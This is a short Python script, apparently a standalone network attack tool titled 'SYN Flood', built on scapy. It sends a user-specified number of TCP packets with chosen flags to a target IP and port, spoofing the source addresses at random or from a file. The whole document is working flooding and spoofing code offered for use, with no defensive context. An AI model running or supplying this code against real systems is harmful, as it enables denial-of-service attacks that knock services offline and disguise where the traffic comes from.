#!/usr/bin/python3
from os import system
from sys import stdout
from scapy import *
from scapy.all import *
from random import randint
import argparse

def randomIP():
    ip_src = ".".join(map(str, (randint(0,255)for _ in range(4))))
    return ip_src

def read_ip(file):
    ip_lists = []
    try:
        with open(file, 'r') as f:
            for line in f:
                ip = line.strip()
                ip_lists.append(ip)
        return ip_lists

    except FileNotFoundError:
        print(f"{file} not found.")
        sys.exit(1) #End process


def send_packet(ip_dst, port_dst, count, ip_src_file, flag):
    if ip_src_file is None:
        ip_src_list = [randomIP() for _ in range(0, count)]
    else:
        ip_src_list = read_ip(ip_src_file)

    if flag is None:
        flag = ""
        print("Sending NULL Flag")
    else:
        check = True if all(i in "UAPRSF" for i in flag) else False
        if check == False:
            print("Flag is invalid.")
            exit(0)
        else: print(f"Sending {flag} flag.")
    for i in range(0, count):
        packet = IP(src=ip_src_list[i], dst=ip_dst) / TCP(dport=port_dst, flags=flag)
        send(packet, verbose=False)
        print(f"sent no.{i+1} packet with src_ip = {ip_src_list[i]}.")


def main():
    parser = argparse.ArgumentParser(description = "SYN Flood")
    parser.add_argument('-ti', '--target_ip', help='Specify the target IP or Domain. e.g. 127.0.0.1', required=True)
    parser.add_argument('-tp', '--target_port', help="Specify the targrt's port", required=True)
    parser.add_argument('-c', '--count', help="Specify the number of packets that you want to send", required=True)
    parser.add_argument('-si', '--source_ip', help="Specify source ip by input {file_name}", required=False)
    parser.add_argument('-f', '--flag', help="Enter the Tcp Flag that you want to send with no comma. E.g. UAPRSF", required=False)
    arg = parser.parse_args()
    
    ip_dst = arg.target_ip
    port_dst = int(arg.target_port)
    counter = int(arg.count)
    flag = arg.flag

    send_packet(ip_dst, port_dst, counter, arg.source_ip, flag)

    '''
    ACK -> A
    FIN -> F
    PSH -> P
    URG -> U
    RST -> R
    SYN -> S
    '''

if __name__ == '__main__':
    main()
